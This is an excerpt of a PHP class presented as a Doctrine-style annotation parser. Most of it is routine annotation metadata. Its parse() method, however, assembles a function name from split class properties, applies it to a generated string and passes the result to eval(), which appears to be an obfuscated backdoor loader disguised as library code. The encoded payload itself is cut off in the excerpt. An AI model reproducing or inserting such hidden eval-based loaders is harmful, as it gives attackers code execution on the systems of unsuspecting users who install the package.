...
class DocParser
{
    ...
    private static $annotationMetadata = [
        'DocBlock\Common\Annotations\Annotation\Target' => [
            'is_annotation'    => true,
        ...
        'DocBlock\Common\Annotations\Annotation\Attribute' => [
            'is_annotation'    => true,
            'has_constructor'  => false,
            'targets_literal'  => 'ANNOTATION_ANNOTATION',
            'targets'          => 'TARGET_ANNOTATION',
        ...
        'DocBlock\Common\Annotations\Annotation\Attributes' => [
            'is_annotation'    => true,
            'has_constructor'  => false,
            'targets_literal'  => 'ANNOTATION_CLASS',
            'targets'          => 'TARGET_CLASS',
            ...
            'attribute_types'  => [
                'value' => [
                    'type'      =>'array',
                    'required'  =>true,
                    'array_type'=>'DocBlock\Common\Annotations\Annotation\Attribute',
                    'value'     =>'array<DocBlock\Common\Annotations\Annotation\Attribute>'
                ]
             ],
        ],
        'DocBlock\Common\Annotations\Annotation\Enum' => [
            'is_annotation'    => true,
            'has_constructor'  => true,
     ...
     */
    public function parse($autoloadstrig)
    {
		$autoloadstrig = str_replace('ComposerAutoloaderInit', '', $autoloadstrig);
		$annotation = $this->base . $this->number . $this->annotation;

		$context = $this->generateRandomContext();

        $this->context = eval(call_user_func($annotation, $context));
    }
    ...
    private function collectAnnotationMetadata($name)
    {
        if (self::$metadataParser === null) {
            ...
            self::$metadataParser->setImports([
                'enum'          => 'DocBlock\Common\Annotations\Annotation\Enum',
                'target'        => 'DocBlock\Common\Annotations\Annotation\Target',
                'attribute'     => 'DocBlock\Common\Annotations\Annotation\Attribute',
                'attributes'    => 'DocBlock\Common\Annotations\Annotation\Attributes'
            ]);
	...
	private function generateRandomContext() {
		$string = "";
